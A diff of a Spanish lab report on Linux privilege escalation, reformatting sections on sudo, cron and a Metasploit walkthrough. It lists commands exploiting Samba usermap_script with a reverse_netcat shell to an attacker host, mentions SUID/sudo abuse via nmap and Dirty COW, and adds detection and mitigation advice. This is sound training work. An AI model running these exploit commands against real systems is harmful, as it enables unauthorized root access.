@@ -252,9 +252,8 @@ Cabe destacar que previamente se ejecutó`su firefart` para hacer el cambio de u
 **NOTA IMPORTANTE**: Dirty COW puede ser destructivo. En un entorno de producción, usa con extrema precaución. Para esta práctica, asegúrate de tener snapshots de tus VMs.
 
 -----
-**
 
-**🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**
+### **🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**
 
 El tercer método a probar es la explotación de la utilidad sudo, ya que si esta se encuentra mal configurada puede permitir que un usuario con pocos privilegios ejecute comandos como si fuera el usuario root.
 
@@ -344,7 +343,6 @@ root
 ```
 
 -----
-**
 
 **🎯 TÉCNICA 4: Explotación de Tareas Cron**
 
@@ -451,43 +449,45 @@ Una vez preparado el entorno, solo queda esperar a que un script o proceso privi
 En nuestro caso, esta técnica resultó ser la más fluida y fácil de ejecutar, ya que solo requiere la preparación del entorno y esperar a que un proceso vulnerable se active, sin necesidad de exploits complejos o configuraciones específicas.
 
 -----
-**
 
-**🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester**
+### **🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester**
 
-**Desde Kali con Metasploit**
+Este método emplea el **Metasploit Framework** (`msfconsole`) para automatizar tanto la explotación inicial de un servicio vulnerable como el proceso de identificación y sugerencia de exploits de escalada de privilegios local.
 
-\# Si tienes una sesión de Meterpreter activa
+#### Paso 1: Obtención de Acceso Inicial (Explotación Remota)
 
-msfconsole
+En esta fase, se utiliza un módulo de explotación remota conocido para obtener la primera *shell* en la máquina objetivo.
 
-\# Obtener sesión primero (ejemplo con usermap\_script)
+| Comando | Propósito | Contexto de Seguridad |
+| :--- | :--- | :--- |
+| **`msfconsole`** | Inicia la consola principal de **Metasploit Framework**. | Es el entorno desde donde se lanzan todos los exploits y módulos. |
+| **`use exploit/multi/samba/usermap_script`** | Carga un exploit para una vulnerabilidad de **Samba** (CVE-2007-2447). | Se aprovecha una falla que permite la ejecución de comandos como `root` a través del mapeo de usuarios. |
+| **`set RHOSTS <192.168.100.20>`** | Define la **dirección IP remota** del sistema objetivo. | Establece la víctima del ataque. |
+| **`set payload cmd/unix/reverse_netcat`** | Configura la carga útil para una **conexión de retorno (*reverse shell*)**. | El objetivo es que la máquina comprometida se conecte de vuelta a la máquina atacante. |
+| **`set LHOST <192.168.100.9>`** | Define la **dirección IP local** del atacante (donde Metasploit escucha). | Establece el punto de recepción de la *reverse shell*. |
+| **`exploit`** | Ejecuta el exploit. | Si es exitoso, se obtiene una **sesión de *shell* activa** en la máquina objetivo. |
 
-msf6 > use exploit/multi/samba/usermap\_script
+---
 
-msf6 exploit > set RHOSTS <192.168.100.20>
+#### Paso 2: Puesta en Segundo Plano de la Sesión
 
-msf6 exploit > set payload cmd/unix/reverse\_netcat
+Una vez obtenida la sesión, se requiere ponerla en *background* para liberar la consola y permitir la ejecución de otros módulos de post-explotación.
 
-msf6 exploit > set LHOST <192.168.100.9>
+```bash
+^Z  # Ctrl+Z: Se utiliza para detener la ejecución y salir de la sesión.
+y   # Confirma que se desea enviar la sesión al background, asignándole un número de SESSION (ej. SESSION 1).
+```
 
-msf6 exploit > exploit
+#### Paso 3: Análisis y Sugerencia de Exploits Locales
 
-\# Una vez con shell, background
+Para la fase de escalada de privilegios local, se utiliza un módulo auxiliar de Metasploit que automatiza la búsqueda de vulnerabilidades.
 
-^Z  # Ctrl+Z
-
-y
-
-\# Usar suggester
-
-msf6 > use post/multi/recon/local\_exploit\_suggester
-
-msf6 post > set SESSION 1
-
-msf6 post > run
-
-\# Revisar exploits sugeridos y probarlos
+| Comando | Propósito | Contexto de Seguridad |
+| :--- | :--- | :--- |
+| **`use post/multi/recon/local_exploit_suggester`** | Carga el módulo de post-explotación para la **sugerencia de exploits locales**. | Este módulo analiza la versión del Kernel y del sistema operativo del objetivo. |
+| **`set SESSION 1`** | Indica al módulo que use la **sesión activa** obtenida previamente. | Vincula el módulo a la máquina objetivo comprometida. |
+| **`run`** | Ejecuta el análisis del módulo. | El módulo compara la información del sistema con las vulnerabilidades conocidas y lista los exploits de escalada de privilegios compatibles (como Dirty COW) que pueden ser probados a continuación. |
+| **`# Revisar exploits sugeridos y probarlos`** | Nota del auditor. | El paso final del proceso es seleccionar uno de los exploits sugeridos por Metasploit e intentar la escalada de privilegios a `root`. |
 
 -----
 **📊 ENTREGABLES DEL EQUIPO 4**
@@ -519,36 +519,68 @@ msf6 post > run
 -----
 **🤔 PREGUNTAS DE REFLEXIÓN**
 
-1. ¿Cuál técnica fue más efectiva y por qué?
-1. ¿Qué técnica dejó menos rastros?
-1. ¿Cómo detectaría un IDS/HIDS estos intentos de escalada?
-1. ¿Qué logs se generaron durante la escalada?
-1. ¿Cuál técnica es más aplicable en sistemas modernos?
-1. ¿Qué diferencia hay entre escalada vertical y horizontal?
+1. **¿Cuál técnica fue más efectiva y por qué?**
+   - La explotación de binarios SUID (p. ej. `nmap --interactive`) y la explotación de `sudo` sobre binarios interactivos (`sudo nmap --interactive`) fueron las más efectivas.
+   - Ya que ambas proporcionan una shell de `root` inmediata y confiable sin necesidad de compilar exploits o modificar muchos archivos. Requieren poca complejidad operacional y funcionan siempre que el binario vulnerable exista con permisos elevados. Dirty COW también es efectiva, pero implica compilar/ejecutar un exploit de kernel (mayor complejidad y riesgo de corrupción o detección).
+
+2. **¿Qué técnica dejó menos rastros?**
+   - Explotar un binario SUID interactivo suele dejar menos trazas en `/var/log/auth.log` que usar `sudo`, porque `sudo` deja registros explícitos. Path hijacking puede ser muy sigiloso si nunca se activa, pero cuando tiene éxito deja artefactos (por ejemplo `/tmp/rootbash` con bit SUID).
+   - Matiz: "menos rastros" no es "sin rastros" — integridad de archivos, marcas de tiempo y reglas de auditoría pueden detectar la actividad.
+
+3. **¿Cómo detectaría un IDS/HIDS estos intentos de escalada?**
+   - Se detectaría combinando detección a nivel host y red. Algunas señales útiles para detectar esto son:
+      - Monitorizar ejecuciones inusuales de binarios privilegiados (execve de `nmap`, `vim`, `find`).
+      - Alertar cambios de permisos (`chmod +s`) y creación de ficheros SUID en `/tmp`.
+      - Revisar `/var/log/auth.log` para uso inesperado de `sudo` y accesos SSH.
+      - Reglas IDS/IPS (Suricata/Zeek) para detectar reverse shells y tráfico inusual saliente (netcat, conexiones reversas).
+      - `auditd`: reglas para `execve` sobre binarios críticos y detección de `useradd`, `chmod`, modificaciones en `/etc/sudoers`.
+
+4. **¿Qué logs se generaron durante la escalada?**
+   - Los logs mas importantes generados durante la escalada fueron:
+      - `/var/log/auth.log` o `/var/log/secure`: entradas de `sudo` y SSH.
+      - `/var/log/syslog` y `/var/log/kern.log`: mensajes del kernel, errores y OOPS.
+      - `/var/log/audit/audit.log`: si `auditd` está activo, contiene exec y cambios de permisos.
+      - Historiales de shell: `~/.bash_history` (usuario) y `/root/.bash_history` (root).
+      - Logs de servicios específicos (ej. `/var/log/mysql/` para intentos UDF, logs de Samba para exploit de Samba).
+   - Algunos comandos útiles para el análisis son:
+   ```sh
+   sudo tail -n 200 /var/log/auth.log
+   sudo ausearch -m EXECVE -ts today
+   sudo journalctl -k
+   ```
+
+5. **¿Cuál técnica es más aplicable en sistemas modernos?**
+   - En sistemas actualizados y parcheados, las configuraciones inseguras siguen siendo el vector más aplicable: `sudo` mal configurado y binarios con SUID innecesarios. Los exploits de kernel (Dirty COW, etc.) son menos probables en sistemas parcheados. Path hijacking sigue siendo relevante cuando existan scripts y tareas con PATH mal definido.
+   - Una recomendación para mejorar la seguirdad es auditar `sudoers`, eliminar SUID innecesarios, usar rutas absolutas en scripts y activar controles de integridad y `auditd`.
+
+6. **¿Qué diferencia hay entre escalada vertical y horizontal?**
+   - **Escalada vertical:** Consiste en obtener mayores privilegios en la misma máquina (ej. `msfadmin` → `root`). Objetivo: aumentar privilegios.
+   - **Escalada horizontal (movimiento lateral):** Consiste en acceder a otras cuentas o sistemas con privilegios similares (ej. reutilizar credenciales para entrar a otra máquina). Objetivo: ampliar acceso en la red.
+
 -----
 **🛡️ MEDIDAS DE MITIGACIÓN**
 
 1. **Binarios SUID**:
-   1. Auditar regularmente archivos con SUID/SGID
-   1. Remover SUID de binarios innecesarios
-   1. Usar nosuid en montajes de particiones
-1. **Kernel**:
-   1. Mantener kernel actualizado
-   1. Aplicar parches de seguridad regularmente
-   1. Implementar kernel hardening (grsecurity, SELinux)
-1. **Sudo**:
-   1. Configurar sudo con principio de mínimo privilegio
-   1. Evitar NOPASSWD en comandos peligrosos
-   1. Auditar configuración de sudoers regularmente
-   1. Usar sudo -l restrictivo
-1. **Cron**:
-   1. Permisos estrictos en scripts de cron
-   1. Usar rutas absolutas en scripts
-   1. Auditar tareas cron regularmente
-1. **General**:
-   1. Implementar AppArmor o SELinux
-   1. Monitorear intentos de escalada (auditd)
-   1. Implementar detección de anomalías
-   1. Segmentación y contenedores
-   1. Principle of Least Privilege (PoLP)
+   1.1 Auditar regularmente archivos con SUID/SGID
+   1.2 Remover SUID de binarios innecesarios
+   1.3 Usar nosuid en montajes de particiones
+2. **Kernel**:
+   2.1 Mantener kernel actualizado
+   2.2 Aplicar parches de seguridad regularmente
+   2.3 Implementar kernel hardening (grsecurity, SELinux)
+3. **Sudo**:
+   3.1 Configurar sudo con principio de mínimo privilegio
+   3.2 Evitar NOPASSWD en comandos peligrosos
+   3.3 Auditar configuración de sudoers regularmente
+   3.4 Usar sudo -l restrictivo
+4. **Cron**:
+   4.1 Permisos estrictos en scripts de cron
+   4.2 Usar rutas absolutas en scripts
+   4.3 Auditar tareas cron regularmente
+5. **General**:
+   5.1 Implementar AppArmor o SELinux
+   5.2 Monitorear intentos de escalada (auditd)
+   5.3 Implementar detección de anomalías
+   5.4 Segmentación y contenedores
+   5.5 Principle of Least Privilege (PoLP)
 -----
